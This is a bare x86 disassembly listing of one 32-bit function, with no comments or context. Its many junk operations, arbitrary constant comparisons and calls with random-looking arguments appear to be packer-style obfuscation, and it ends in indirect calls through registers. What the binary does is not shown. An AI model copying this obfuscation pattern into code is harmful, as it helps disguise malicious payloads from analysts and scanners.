  405f39:	mov    ecx,DWORD PTR [ebp-0x3c]
  405f3c:	push   0x69
  405f3e:	push   0x63b6d300
  405f43:	push   0x7a7eb00
  405f48:	push   0x23bd4a00
  405f4d:	push   0xf6f6c00
  405f52:	call   0x408250
  405f57:	add    esp,0x14
  405f5a:	call   0x408da2
  405f5f:	mov    edx,DWORD PTR ds:0x44a3bc
  405f65:	mov    eax,DWORD PTR [ebp-0x3c]
  405f68:	mov    edi,DWORD PTR [ebp-0xc]
  405f6b:	add    eax,eax
  405f6d:	add    edi,edx
  405f6f:	cmp    eax,DWORD PTR [ebp-0x38]
  405f72:	jne    0x405f91
  405f74:	cmp    eax,edi
  405f76:	je     0x405f91
  405f78:	mov    esi,0x19f3
  405f7d:	mov    ecx,0xb7
  405f82:	and    edi,eax
  405f84:	add    ecx,edi
  405f86:	sub    DWORD PTR [ebp-0xc],esi
  405f89:	cmp    ecx,0xffffffb1
  405f8c:	je     0x405f91
  405f8e:	and    DWORD PTR [ebp-0xc],ecx
  405f91:	mov    ecx,DWORD PTR [ebp-0x3c]
  405f94:	test   ecx,0x38
  405f9a:	jne    0x405fc2
  405f9c:	mov    edi,DWORD PTR [ebp-0xc]
  405f9f:	mov    esi,DWORD PTR [ebp-0xc]
  405fa2:	add    DWORD PTR [ebp-0x3c],ecx
  405fa5:	sub    DWORD PTR [ebp-0xc],ebx
  405fa8:	add    DWORD PTR [ebp-0x3c],ebx
  405fab:	add    edi,eax
  405fad:	test   edi,0xc3
  405fb3:	jne    0x405fc2
  405fb5:	mov    DWORD PTR [ebp-0xc],esi
  405fb8:	cmp    edi,eax
  405fba:	je     0x405fc2
  405fbc:	sub    DWORD PTR [ebp-0x3c],esi
  405fbf:	mov    DWORD PTR [ebp-0xc],edi
  405fc2:	mov    DWORD PTR [ebp-0x18],edx
  405fc5:	mov    esi,DWORD PTR [ebp-0xc]
  405fc8:	test   esi,0x4d
  405fce:	je     0x406007
  405fd0:	add    DWORD PTR [ebp-0xc],eax
  405fd3:	mov    ecx,DWORD PTR [ebp-0xc]
  405fd6:	cmp    ecx,0x13
  405fd9:	jne    0x406007
  405fdb:	cmp    esi,DWORD PTR [ebp-0x60]
  405fde:	jne    0x406007
  405fe0:	cmp    eax,0xa9cc
  405fe5:	jne    0x406007
  405fe7:	sub    ecx,ebx
  405fe9:	or     ecx,edx
  405feb:	cmp    ecx,0xffffff82
  405fee:	je     0x406007
  405ff0:	sub    esi,eax
  405ff2:	mov    edi,DWORD PTR [ebp-0x3c]
  405ff5:	mov    eax,DWORD PTR [ebp-0xc]
  405ff8:	add    DWORD PTR [ebp-0xc],eax
  405ffb:	and    esi,ecx
  405ffd:	add    esi,eax
  405fff:	sub    esi,edx
  406001:	sub    DWORD PTR [ebp-0xc],edi
  406004:	sub    DWORD PTR [ebp-0x3c],esi
  406007:	mov    DWORD PTR [ebp-0xc],ecx
  40600a:	add    ebx,edx
  40600c:	mov    DWORD PTR [ebp-0xc],ecx
  40600f:	mov    ecx,0x6d
  406014:	mov    edi,eax
  406016:	add    edi,edx
  406018:	cmp    edi,0x42
  40601b:	jne    0x4060d4
  406021:	mov    eax,0x3b
  406026:	mov    esi,DWORD PTR [ebp-0xc]
  406029:	sub    edi,edx
  40602b:	add    DWORD PTR [ebp-0x3c],ecx
  40602e:	cmp    edi,0x5b
  406031:	jne    0x4060d4
  406037:	add    DWORD PTR [ebp-0x3c],edi
  40603a:	mov    edi,DWORD PTR [ebp-0xc]
  40603d:	and    edi,ebx
  40603f:	add    DWORD PTR [ebp-0x3c],esi
  406042:	mov    ecx,DWORD PTR [ebp-0x3c]
  406045:	cmp    ecx,0x53
  406048:	jne    0x4060d4
  40604e:	mov    esi,DWORD PTR ds:0x44a3a8
  406054:	test   ecx,0xa1
  40605a:	jne    0x4060d4
  40605c:	cmp    edi,DWORD PTR ds:0x44a3ac
  406062:	jne    0x4060d4
  406064:	and    eax,ebx
  406066:	add    DWORD PTR [ebp-0xc],edi
  406069:	mov    edi,DWORD PTR [ebp-0x3c]
  40606c:	add    esi,ebx
  40606e:	add    DWORD PTR [ebp-0xc],eax
  406071:	mov    DWORD PTR [ebp-0x3c],esi
  406074:	sub    edi,eax
  406076:	cmp    ecx,DWORD PTR ds:0x44a3bc
  40607c:	jne    0x4060d4
  40607e:	cmp    ecx,0x3
  406081:	jne    0x4060d4
  406083:	mov    eax,DWORD PTR [ebp-0x3c]
  406086:	sub    DWORD PTR [ebp-0x3c],edi
  406089:	cmp    eax,0xffffff82
  40608c:	jne    0x4060d4
  40608e:	mov    esi,DWORD PTR [ebp-0xc]
  406091:	mov    edi,0x9a
  406096:	add    DWORD PTR [ebp-0x3c],ecx
  406099:	mov    DWORD PTR [ebp-0xc],eax
  40609c:	sub    esi,edx
  40609e:	mov    DWORD PTR [ebp-0x48],esi
  4060a1:	cmp    eax,edx
  4060a3:	jne    0x4060d4
  4060a5:	cmp    esi,DWORD PTR [ebp-0x40]
  4060a8:	je     0x4060d4
  4060aa:	mov    edi,DWORD PTR [ebp-0xc]
  4060ad:	add    DWORD PTR [ebp-0x3c],edx
  4060b0:	mov    esi,0x6041
  4060b5:	add    esi,edx
  4060b7:	sub    DWORD PTR [ebp-0x48],ecx
  4060ba:	add    edi,ecx
  4060bc:	add    esi,ecx
  4060be:	sub    DWORD PTR [ebp-0x48],edi
  4060c1:	cmp    esi,DWORD PTR ds:0x44a3ac
  4060c7:	je     0x4060d4
  4060c9:	cmp    esi,DWORD PTR ds:0x44a3ac
  4060cf:	je     0x4060d4
  4060d1:	or     DWORD PTR [ebp-0x3c],esi
  4060d4:	add    ebx,edx
  4060d6:	call   0x408589
  4060db:	push   0x16
  4060dd:	push   0xf7794500
  4060e2:	push   0x3d
  4060e4:	push   0xe38fe300
  4060e9:	call   0x408817
  4060ee:	add    esp,0x10
  4060f1:	push   0x31
  4060f3:	push   0xd3bd2c00
  4060f8:	push   0x5715ae00
  4060fd:	call   0x40807c
  406102:	add    esp,0xc
  406105:	add    DWORD PTR [ebp-0x18],ebx
  406108:	sub    edi,ebx
  40610a:	push   0x76
  40610c:	call   0x408250
  406111:	add    esp,0x4
  406114:	cmp    edi,esi
  406116:	jne    0x406248
  40611c:	push   0x57459c00
  406121:	push   0xffffffd6
  406123:	push   0x31
  406125:	push   0x67e78800
  40612a:	call   0x408c13
  40612f:	add    esp,0x10
  406132:	push   0x32
  406134:	call   0x4086d1
  406139:	add    esp,0x4
  40613c:	mov    esi,eax
  40613e:	call   0x408e8e
  406143:	test   edi,0x83
  406149:	je     0x406248
  40614f:	mov    DWORD PTR [ebp-0x28],eax
  406152:	push   0x378cda00
  406157:	push   0x576d4200
  40615c:	push   0x770c3f00
  406161:	call   0x408250
  406166:	add    esp,0xc
  406169:	push   0x33891500
  40616e:	push   0xffffffbd
  406170:	push   0xffffff88
  406172:	push   0xffffffb1
  406174:	push   0xd7e2ae00
  406179:	call   0x40807c
  40617e:	add    esp,0x14
  406181:	push   0xffffffba
  406183:	push   0xfffffff6
  406185:	push   0x4f5f5900
  40618a:	push   0x1bcfe300
  40618f:	call   0x408aa5
  406194:	add    esp,0x10
  406197:	push   0xf2c0700
  40619c:	push   0xffffff85
  40619e:	push   0x5741e100
  4061a3:	push   0x21
  4061a5:	call   0x408817
  4061aa:	add    esp,0x10
  4061ad:	add    edi,esi
  4061af:	mov    esi,DWORD PTR ds:0x44a3d0
  4061b5:	push   0x20
  4061b7:	push   0xffffffb0
  4061b9:	push   0x3bcc0300
  4061be:	push   0x5c
  4061c0:	push   0x15
  4061c2:	call   0x408589
  4061c7:	add    esp,0x14
  4061ca:	sub    DWORD PTR [ebp-0x3c],esi
  4061cd:	xor    ecx,ecx
  4061cf:	push   0xffffffe8
  4061d1:	push   0xffffffe3
  4061d3:	push   0x6bbf9700
  4061d8:	push   0xffffff9a
  4061da:	call   0x408da2
  4061df:	add    esp,0x10
  4061e2:	call   0x408250
  4061e7:	sub    edi,esi
  4061e9:	push   0x63
  4061eb:	push   0x951ca700
  4061f0:	call   0x408817
  4061f5:	add    esp,0x8
  4061f8:	push   0x77853200
  4061fd:	push   0xffffffa1
  4061ff:	call   0x408250
  406204:	add    esp,0x8
  406207:	push   0x8f0aa100
  40620c:	call   0x408817
  406211:	add    esp,0x4
  406214:	sub    edi,ebx
  406216:	cmp    edi,DWORD PTR [ebp-0x64]
  406219:	je     0x406248
  40621b:	push   0xa3c9aa00
  406220:	push   0xfffffffa
  406222:	push   0x1c
  406224:	push   0xffffffb3
  406226:	push   0x2c
  406228:	call   0x408aa5
  40622d:	add    esp,0x14
  406230:	push   0x453fe300
  406235:	call   0x408250
  40623a:	add    esp,0x4
  40623d:	add    DWORD PTR [ebp-0x3c],eax
  406240:	call   0x40807c
  406245:	or     DWORD PTR [ebp-0xc],edi
  406248:	cmp    eax,ecx
  40624a:	je     0x406258
  40624c:	sub    eax,ebx
  40624e:	push   0xffffff82
  406250:	call   0x408da2
  406255:	add    esp,0x4
  406258:	cmp    edi,0xb576
  40625e:	jne    0x406279
  406260:	push   0x353e3600
  406265:	push   0xffffff95
  406267:	push   0x4f21fe00
  40626c:	push   0x8f791700
  406271:	call   0x4086d1
  406276:	add    esp,0x10
  406279:	push   0x8f1f4700
  40627e:	call   0x408aa5
  406283:	add    esp,0x4
  406286:	add    DWORD PTR [ebp-0x3c],esi
  406289:	push   0x73
  40628b:	push   0x5fb9ed00
  406290:	push   0x3bc60500
  406295:	push   0x6
  406297:	call   0x408da2
  40629c:	add    esp,0x10
  40629f:	mov    edi,DWORD PTR [ebp-0x3c]
  4062a2:	add    DWORD PTR [ebp-0x3c],edi
  4062a5:	push   0xfffffffb
  4062a7:	push   0x15427c00
  4062ac:	push   0xf3fa6300
  4062b1:	call   0x408e8e
  4062b6:	add    esp,0xc
  4062b9:	mov    ecx,0xae
  4062be:	push   0xa55c6900
  4062c3:	call   0x408da2
  4062c8:	add    esp,0x4
  4062cb:	mov    edi,DWORD PTR [ebp-0x3c]
  4062ce:	sub    edi,esi
  4062d0:	push   0x3bab1500
  4062d5:	push   0xeb8d7a00
  4062da:	push   0xfffffff2
  4062dc:	push   0xffffffea
  4062de:	call   0x408c13
  4062e3:	add    esp,0x10
  4062e6:	call   0x4086d1
  4062eb:	and    DWORD PTR [ebp-0xc],edi
  4062ee:	push   0x49
  4062f0:	push   0x7b
  4062f2:	push   0x8f9ae900
  4062f7:	push   0x7b880200
  4062fc:	call   0x40807c
  406301:	add    esp,0x10
  406304:	sub    DWORD PTR [ebp-0x3c],ebx
  406307:	push   0xffffff8e
  406309:	push   0x2bdf3800
  40630e:	push   0xffffff8a
  406310:	push   0xffffff91
  406312:	call   0x408589
  406317:	add    esp,0x10
  40631a:	add    DWORD PTR [ebp-0xc],edi
  40631d:	call   0x408250
  406322:	push   0x7fc52000
  406327:	push   0x6578c900
  40632c:	call   0x4086d1
  406331:	add    esp,0x8
  406334:	sub    ebx,esi
  406336:	push   0xc54ea900
  40633b:	push   0x27961800
  406340:	push   0x28
  406342:	call   0x408817
  406347:	add    esp,0xc
  40634a:	push   0xffffffe5
  40634c:	push   0xf5bb300
  406351:	push   0x6f
  406353:	call   0x408589
  406358:	add    esp,0xc
  40635b:	push   0xd7b59000
  406360:	push   0x5c
  406362:	push   0x37
  406364:	push   0x77151500
  406369:	push   0x43cc0400
  40636e:	call   0x408c13
  406373:	add    esp,0x14
  406376:	mov    eax,0xf3
  40637b:	push   0x72
  40637d:	push   0xfffffffb
  40637f:	push   0x1faf0d00
  406384:	call   0x408aa5
  406389:	add    esp,0xc
  40638c:	push   0xf548e100
  406391:	push   0x7
  406393:	push   0xffffffb6
  406395:	call   0x408250
  40639a:	add    esp,0xc
  40639d:	test   edi,0x46
  4063a3:	je     0x40643a
  4063a9:	push   0xcf2a6e00
  4063ae:	push   0x757fe300
  4063b3:	push   0x77558900
  4063b8:	push   0xffffff86
  4063ba:	push   0xffffffb5
  4063bc:	call   0x408aa5
  4063c1:	add    esp,0x14
  4063c4:	push   0xffffff8b
  4063c6:	push   0x573ac100
  4063cb:	push   0x20
  4063cd:	push   0xffffff99
  4063cf:	push   0xfffffff8
  4063d1:	call   0x408c13
  4063d6:	add    esp,0x14
  4063d9:	sub    ebx,edi
  4063db:	mov    ecx,DWORD PTR [ebp-0x3c]
  4063de:	push   0xffac2900
  4063e3:	push   0xfffffff8
  4063e5:	push   0x6f805800
  4063ea:	push   0x35239200
  4063ef:	call   0x408e8e
  4063f4:	add    esp,0x10
  4063f7:	cmp    ebx,DWORD PTR ds:0x44a3bc
  4063fd:	je     0x40643a
  4063ff:	and    ebx,esi
  406401:	xor    eax,eax
  406403:	push   0x7ff9fb00
  406408:	push   0x52
  40640a:	push   0x75138e00
  40640f:	push   0x4577df00
  406414:	call   0x408aa5
  406419:	add    esp,0x10
  40641c:	push   0x57e7300
  406421:	push   0x1bb4ce00
  406426:	push   0x3531f600
  40642b:	push   0xffffffcf
  40642d:	push   0xffffffd9
  40642f:	call   0x408589
  406434:	add    esp,0x14
  406437:	add    DWORD PTR [ebp-0xc],ebx
  40643a:	push   0x8538ca00
  40643f:	push   0x7a
  406441:	push   0xffffffa2
  406443:	call   0x408da2
  406448:	add    esp,0xc
  40644b:	cmp    edi,0x10
  40644e:	jne    0x406468
  406450:	push   0x776fe000
  406455:	push   0xffffff91
  406457:	push   0xaff13100
  40645c:	push   0x42
  40645e:	push   0x7a
  406460:	call   0x40807c
  406465:	add    esp,0x14
  406468:	call   0x408250
  40646d:	push   0xffffff85
  40646f:	push   0x4788c800
  406474:	push   0x5f875100
  406479:	push   0xbfeb8700
  40647e:	push   0xffffffd4
  406480:	call   0x408e8e
  406485:	add    esp,0x14
  406488:	mov    edx,eax
  40648a:	sub    edx,esi
  40648c:	push   0xffffffbc
  40648e:	push   0x852ec800
  406493:	push   0x25269c00
  406498:	push   0x5f
  40649a:	push   0x45
  40649c:	call   0x408da2
  4064a1:	add    esp,0x14
  4064a4:	push   0x2bbe6200
  4064a9:	call   0x4086d1
  4064ae:	add    esp,0x4
  4064b1:	push   0xbbf81300
  4064b6:	push   0xffffff8d
  4064b8:	push   0x5710b900
  4064bd:	push   0x78
  4064bf:	push   0x775ae800
  4064c4:	call   0x40807c
  4064c9:	add    esp,0x14
  4064cc:	push   0x7
  4064ce:	push   0x8ffc5700
  4064d3:	push   0xffffffee
  4064d5:	push   0xabb50c00
  4064da:	push   0xffffff8f
  4064dc:	call   0x408817
  4064e1:	add    esp,0x14
  4064e4:	mov    eax,0x9d
  4064e9:	cmp    ebx,0xc881
  4064ef:	jne    0x406520
  4064f1:	mov    ecx,DWORD PTR [ebp-0x3c]
  4064f4:	mov    ebx,DWORD PTR [ebp-0x3c]
  4064f7:	cmp    ecx,DWORD PTR ds:0x44a3d0
  4064fd:	je     0x406520
  4064ff:	mov    edi,eax
  406501:	sub    DWORD PTR [ebp-0x3c],edi
  406504:	mov    esi,DWORD PTR [ebp-0x3c]
  406507:	add    ecx,ebx
  406509:	add    ecx,ecx
  40650b:	and    DWORD PTR [ebp-0x3c],esi
  40650e:	push   0x5fc61600
  406513:	push   0x95615300
  406518:	call   0x408817
  40651d:	add    esp,0x8
  406520:	mov    edi,eax
  406522:	push   0xf55cbc00
  406527:	push   0x38
  406529:	push   0xffffffa9
  40652b:	call   0x408250
  406530:	add    esp,0xc
  406533:	call   0x408250
  406538:	add    DWORD PTR [ebp-0x3c],edi
  40653b:	cmp    esi,0xffffffc4
  40653e:	jne    0x40654f
  406540:	push   0xf7472d00
  406545:	push   0x1b
  406547:	call   0x408817
  40654c:	add    esp,0x8
  40654f:	push   0xc3898c00
  406554:	push   0xffffff9b
  406556:	push   0xc
  406558:	push   0xffffffde
  40655a:	call   0x40807c
  40655f:	add    esp,0x10
  406562:	call   0x408589
  406567:	xor    ebx,ebx
  406569:	add    ebx,edi
  40656b:	xor    eax,eax
  40656d:	add    DWORD PTR [ebp-0xc],eax
  406570:	sub    ebx,esi
  406572:	push   0x4fef3300
  406577:	push   0x31
  406579:	push   0xf5128b00
  40657e:	push   0xc
  406580:	call   0x408e8e
  406585:	add    esp,0x10
  406588:	push   0xf778d800
  40658d:	push   0xffffff81
  40658f:	call   0x408c13
  406594:	add    esp,0x8
  406597:	push   0xffd2e00
  40659c:	push   0xa
  40659e:	push   0x25161b00
  4065a3:	push   0xffffff9d
  4065a5:	push   0x3b79200
  4065aa:	call   0x408da2
  4065af:	add    esp,0x14
  4065b2:	push   0xffffffcf
  4065b4:	push   0x7f
  4065b6:	push   0xffffffda
  4065b8:	call   0x408250
  4065bd:	add    esp,0xc
  4065c0:	sub    ebx,edi
  4065c2:	push   0xffffffb5
  4065c4:	push   0x47
  4065c6:	push   0xffffff88
  4065c8:	call   0x408e8e
  4065cd:	add    esp,0xc
  4065d0:	push   0x33e7af00
  4065d5:	push   0xffffffbe
  4065d7:	push   0xffffffcc
  4065d9:	push   0x5512bb00
  4065de:	call   0x408e8e
  4065e3:	add    esp,0x10
  4065e6:	xor    DWORD PTR [ebp-0xc],ebx
  4065e9:	push   0x45259100
  4065ee:	push   0x4574a100
  4065f3:	push   0xffffff97
  4065f5:	call   0x408e8e
  4065fa:	add    esp,0xc
  4065fd:	mov    ebx,DWORD PTR ds:0x44a3bc
  406603:	call   0x408c13
  406608:	add    DWORD PTR [ebp-0x3c],ebx
  40660b:	push   0x70
  40660d:	push   0xffffffae
  40660f:	push   0xffffff8f
  406611:	push   0xebd2c300
  406616:	push   0x5396f00
  40661b:	call   0x408817
  406620:	add    esp,0x14
  406623:	lea    esi,[ebp-0x54]
  406626:	push   0xf39e6400
  40662b:	push   0x357a6d00
  406630:	push   0xfffffff3
  406632:	push   0xbfc05300
  406637:	push   0x3b
  406639:	call   0x408817
  40663e:	add    esp,0x14
  406641:	push   0x4f3e0600
  406646:	push   0xffffff9f
  406648:	push   0x37
  40664a:	push   0x57d1aa00
  40664f:	call   0x4086d1
  406654:	add    esp,0x10
  406657:	push   0xffffffe4
  406659:	push   0x6b8f1600
  40665e:	call   0x408817
  406663:	add    esp,0x8
  406666:	push   esi
  406667:	push   0x3af3700
  40666c:	push   0xe
  40666e:	push   0xffffffa2
  406670:	push   0xfffffffe
  406672:	push   0x34
  406674:	call   0x408aa5
  406679:	add    esp,0x14
  40667c:	push   0x1b93de00
  406681:	push   0x772de400
  406686:	push   0x554ffb00
  40668b:	push   0xb5347700
  406690:	call   0x408c13
  406695:	add    esp,0x10
  406698:	push   0xa076a154
  40669d:	push   0x1b84ed00
  4066a2:	push   0x87f11700
  4066a7:	push   0xa7a3a300
  4066ac:	push   0x77271800
  4066b1:	push   0x4f721b00
  4066b6:	call   0x408e8e
  4066bb:	add    esp,0x14
  4066be:	push   0x42
  4066c0:	push   0xffffffd4
  4066c2:	call   0x4086d1
  4066c7:	add    esp,0x8
  4066ca:	mov    ebx,DWORD PTR [ebp-0x3c]
  4066cd:	call   0x408aa5
  4066d2:	xor    edi,edi
  4066d4:	push   0x43
  4066d6:	push   0x22
  4066d8:	push   0xa7918900
  4066dd:	push   0xffffff93
  4066df:	push   0xffffffa6
  4066e1:	call   0x4086d1
  4066e6:	add    esp,0x14
  4066e9:	push   0xc3f43900
  4066ee:	push   0x39eee00
  4066f3:	push   0xffffff90
  4066f5:	call   0x408250
  4066fa:	add    esp,0xc
  4066fd:	push   0xe7c9b800
  406702:	call   0x408e8e
  406707:	add    esp,0x4
  40670a:	push   0xffffff90
  40670c:	push   0x8533c000
  406711:	push   0x57185b00
  406716:	call   0x408817
  40671b:	add    esp,0xc
  40671e:	push   0xffffff9c
  406720:	push   0x62
  406722:	call   0x40807c
  406727:	add    esp,0x8
  40672a:	call   0x408aa5
  40672f:	push   0x5f
  406731:	push   0xf767fe00
  406736:	push   0x95041d00
  40673b:	call   0x408250
  406740:	add    esp,0xc
  406743:	cmp    ebx,DWORD PTR ds:0x44a3ac
  406749:	je     0x4067fc
  40674f:	add    edi,eax
  406751:	mov    DWORD PTR [ebp-0x3c],esi
  406754:	call   0x408817
  406759:	mov    edx,0xed
  40675e:	push   0x4bd80800
  406763:	call   0x408589
  406768:	add    esp,0x4
  40676b:	mov    esi,DWORD PTR [ebp-0xc]
  40676e:	sub    ebx,edi
  406770:	push   0xffffffa7
  406772:	push   0x6f864e00
  406777:	push   0x8f6e7400
  40677c:	push   0x71
  40677e:	push   0xffffffd2
  406780:	call   0x408589
  406785:	add    esp,0x14
  406788:	add    DWORD PTR [ebp-0xc],esi
  40678b:	push   0x76
  40678d:	push   0x21
  40678f:	push   0xd7b49600
  406794:	call   0x408c13
  406799:	add    esp,0xc
  40679c:	push   0x3b
  40679e:	push   0xffffffde
  4067a0:	call   0x408817
  4067a5:	add    esp,0x8
  4067a8:	call   0x40807c
  4067ad:	push   0x878e0900
  4067b2:	push   0x45
  4067b4:	push   0x97da1f00
  4067b9:	push   0x43
  4067bb:	call   0x408c13
  4067c0:	add    esp,0x10
  4067c3:	or     ebx,edi
  4067c5:	add    ebx,esi
  4067c7:	push   0x72
  4067c9:	push   0xffffffe8
  4067cb:	call   0x408e8e
  4067d0:	add    esp,0x8
  4067d3:	push   0xffffffea
  4067d5:	push   0x3b
  4067d7:	push   0xe52dd200
  4067dc:	call   0x408250
  4067e1:	add    esp,0xc
  4067e4:	push   0x43
  4067e6:	push   0xffffffe1
  4067e8:	push   0x3fdee300
  4067ed:	push   0x50
  4067ef:	push   0xc
  4067f1:	call   0x408e8e
  4067f6:	add    esp,0x14
  4067f9:	add    DWORD PTR [ebp-0x3c],ebx
  4067fc:	push   0x1baebb00
  406801:	push   0xffffffcb
  406803:	push   0x15635600
  406808:	call   0x408817
  40680d:	add    esp,0xc
  406810:	call   0x406f4a
  406815:	and    edi,ebx
  406817:	push   0x53
  406819:	push   0xb53aa800
  40681e:	push   0x5509b200
  406823:	push   0xffffffd5
  406825:	call   0x408e8e
  40682a:	add    esp,0x10
  40682d:	push   0x37869400
  406832:	push   0xffffffc0
  406834:	push   0x66
  406836:	push   0x20
  406838:	push   0xcf9ef700
  40683d:	call   0x40807c
  406842:	add    esp,0x14
  406845:	mov    esi,DWORD PTR [ebp-0xc]
  406848:	push   0xbc37e00
  40684d:	push   0x1c
  40684f:	push   0x57781d00
  406854:	call   0x40807c
  406859:	add    esp,0xc
  40685c:	push   0xe5549e00
  406861:	push   0xffffffcd
  406863:	push   0x9532b600
  406868:	push   0x67
  40686a:	call   0x408250
  40686f:	add    esp,0x10
  406872:	call   0x408aa5
  406877:	push   0x154db900
  40687c:	push   0xffffffb2
  40687e:	call   0x408589
  406883:	add    esp,0x8
  406886:	add    DWORD PTR [ebp-0x3c],esi
  406889:	add    DWORD PTR [ebp-0xc],ebx
  40688c:	mov    ecx,DWORD PTR [ebp-0x3c]
  40688f:	and    ecx,esi
  406891:	sub    DWORD PTR [ebp-0x3c],edi
  406894:	and    DWORD PTR [ebp-0xc],esi
  406897:	push   0xffffffdd
  406899:	push   0xffffffb3
  40689b:	push   0xffffffa9
  40689d:	push   0x45042b00
  4068a2:	call   0x408589
  4068a7:	add    esp,0x10
  4068aa:	push   0x11
  4068ac:	push   0x20
  4068ae:	push   0xffffff9c
  4068b0:	push   0x42
  4068b2:	push   0x42
  4068b4:	call   0x408250
  4068b9:	add    esp,0x14
  4068bc:	mov    ebx,DWORD PTR [ebp-0x54]
  4068bf:	push   0x57627100
  4068c4:	push   0xf73caf00
  4068c9:	push   0xc3ac1300
  4068ce:	push   0xfffffffa
  4068d0:	call   0x408817
  4068d5:	add    esp,0x10
  4068d8:	shr    ebx,0x10
  4068db:	mov    edi,DWORD PTR [ebp-0x3c]
  4068de:	push   0xcf27cf00
  4068e3:	push   0x7576f500
  4068e8:	push   0x6546f500
  4068ed:	call   0x408c13
  4068f2:	add    esp,0xc
  4068f5:	push   0xffffffb4
  4068f7:	push   0xcf482a00
  4068fc:	push   0xc5267700
  406901:	push   0x57bf5100
  406906:	push   0xffffffb0
  406908:	call   0x40807c
  40690d:	add    esp,0x14
  406910:	cmp    edi,DWORD PTR ds:0x44a3d0
  406916:	je     0x40698e
  406918:	add    edi,eax
  40691a:	push   0xffffffb8
  40691c:	push   0x57a8e00
  406921:	call   0x4086d1
  406926:	add    esp,0x8
  406929:	push   0x61
  40692b:	push   0xdfab8a00
  406930:	push   0xffffff86
  406932:	push   0x2f
  406934:	call   0x4086d1
  406939:	add    esp,0x10
  40693c:	call   0x408250
  406941:	xor    edx,edx
  406943:	push   0xffffff93
  406945:	call   0x408250
  40694a:	add    esp,0x4
  40694d:	and    edi,ebx
  40694f:	mov    edx,DWORD PTR [ebp-0xc]
  406952:	cmp    edi,0xe435
  406958:	je     0x40698e
  40695a:	cmp    edi,0x46
  40695d:	je     0x40698e
  40695f:	cmp    edi,DWORD PTR [ebp-0x5c]
  406962:	jne    0x40698e
  406964:	mov    eax,DWORD PTR [ebp-0xc]
  406967:	add    edi,ebx
  406969:	mov    ecx,DWORD PTR ds:0x44a3ac
  40696f:	mov    DWORD PTR [ebp-0xc],eax
  406972:	push   0x5f87eb00
  406977:	push   0x85666e00
  40697c:	push   0x5c
  40697e:	push   0x8f7f2a00
  406983:	call   0x408250
  406988:	add    esp,0x10
  40698b:	add    DWORD PTR [ebp-0x3c],edi
  40698e:	cmp    ebx,0xc2f
  406994:	jne    0x406eac
  40699a:	push   0xa3a46c00
  40699f:	push   0xffffffc9
  4069a1:	call   0x4086d1
  4069a6:	add    esp,0x8
  4069a9:	mov    ecx,0xc6fe4d5
  4069ae:	mov    eax,DWORD PTR [ebp-0xc]
  4069b1:	cmp    eax,0xffffffaf
  4069b4:	je     0x4069c5
  4069b6:	xor    esi,esi
  4069b8:	or     esi,ecx
  4069ba:	or     DWORD PTR [ebp-0xc],eax
  4069bd:	mov    esi,DWORD PTR [ebp-0x3c]
  4069c0:	and    esi,edi
  4069c2:	add    DWORD PTR [ebp-0x3c],esi
  4069c5:	sub    ecx,DWORD PTR [ebp-0x54]
  4069c8:	cmp    edi,0x24
  4069cb:	jne    0x4069e6
  4069cd:	mov    edi,DWORD PTR [ebp-0xc]
  4069d0:	sub    DWORD PTR [ebp-0xc],ebx
  4069d3:	mov    edx,esi
  4069d5:	sub    DWORD PTR [ebp-0x3c],ecx
  4069d8:	test   edx,0x55109a61
  4069de:	jne    0x4069e6
  4069e0:	or     DWORD PTR [ebp-0x3c],edi
  4069e3:	and    DWORD PTR [ebp-0xc],edx
  4069e6:	call   ecx
  4069e8:	mov    ebx,DWORD PTR ds:0x44a3d0
  4069ee:	sub    ebx,esi
  4069f0:	add    ebx,esi
  4069f2:	cmp    ebx,DWORD PTR [ebp-0x1c]
  4069f5:	je     0x406a15
  4069f7:	or     ebx,esi
  4069f9:	test   ebx,0x31
  4069ff:	je     0x406a15
  406a01:	mov    edx,DWORD PTR [ebp-0x3c]
  406a04:	mov    edi,DWORD PTR ds:0x44a3bc
  406a0a:	add    DWORD PTR [ebp-0x3c],edx
  406a0d:	add    DWORD PTR [ebp-0x3c],edi
  406a10:	sub    ebx,edi
  406a12:	add    DWORD PTR [ebp-0x3c],ebx
  406a15:	mov    DWORD PTR [ebp-0x8],eax
  406a18:	sub    esi,ebx
  406a1a:	xor    ebx,ebx
  406a1c:	mov    eax,DWORD PTR [ebp-0xc]
  406a1f:	push   0x5607e00
  406a24:	push   0xffffffb7
  406a26:	push   0xcf24e900
  406a2b:	call   0x40807c
  406a30:	add    esp,0xc
  406a33:	sub    esi,ebx
  406a35:	add    DWORD PTR [ebp-0x3c],esi
  406a38:	push   0x5f9fed00
  406a3d:	push   0x355eae00
  406a42:	push   0x78
  406a44:	call   0x408c13
  406a49:	add    esp,0xc
  406a4c:	mov    edi,0x407718
  406a51:	push   0xffffffb1
  406a53:	call   0x408da2
  406a58:	add    esp,0x4
  406a5b:	push   0x8f019500
  406a60:	call   0x408250
  406a65:	add    esp,0x4
  406a68:	push   DWORD PTR [ebp-0x54]
  406a6b:	push   0xc30b063
  406a70:	push   DWORD PTR [ebp-0x8]
  406a73:	call   edi
  406a75:	mov    eax,0xebe2
  406a7a:	mov    esi,DWORD PTR [ebp-0xc]
  406a7d:	push   0xbfb6e000
  406a82:	push   0x4fcccd00
  406a87:	push   0xbb86ab00
  406a8c:	call   0x408817
  406a91:	add    esp,0xc
  406a94:	push   0xfffffff8
  406a96:	call   0x408da2
  406a9b:	add    esp,0x4
  406a9e:	push   0x857fe800
  406aa3:	push   0xb78f2600
  406aa8:	push   0xffffffbc
  406aaa:	push   0x57617600
  406aaf:	push   0x21
  406ab1:	call   0x408817
  406ab6:	add    esp,0x14
  406ab9:	sub    esi,eax
  406abb:	call   0x408e8e
  406ac0:	push   0xffffffb7
  406ac2:	push   0xd530c100
  406ac7:	call   0x408817
  406acc:	add    esp,0x8
  406acf:	push   0xd52b1e00
  406ad4:	push   0x1b875600
  406ad9:	push   0x5fe5bf00
  406ade:	push   0xffffff87
  406ae0:	call   0x408589
  406ae5:	add    esp,0x10
  406ae8:	call   0x408250
  406aed:	push   0xfffb5100
  406af2:	push   0xa5732300
  406af7:	call   0x408817
  406afc:	add    esp,0x8
  406aff:	and    esi,eax
  406b01:	call   0x408da2
  406b06:	call   0x408aa5
  406b0b:	push   0xf937500
  406b10:	push   0x67
  406b12:	call   0x408589
  406b17:	add    esp,0x8
  406b1a:	or     DWORD PTR [ebp-0xc],esi
  406b1d:	push   0xffffffc2
  406b1f:	call   0x408250
  406b24:	add    esp,0x4
  406b27:	add    DWORD PTR [ebp-0x3c],edi
  406b2a:	add    DWORD PTR [ebp-0x8],0x15
  406b31:	push   0xc3fa8500
  406b36:	call   0x4086d1
  406b3b:	add    esp,0x4
  406b3e:	mov    esi,DWORD PTR [ebp-0x8]
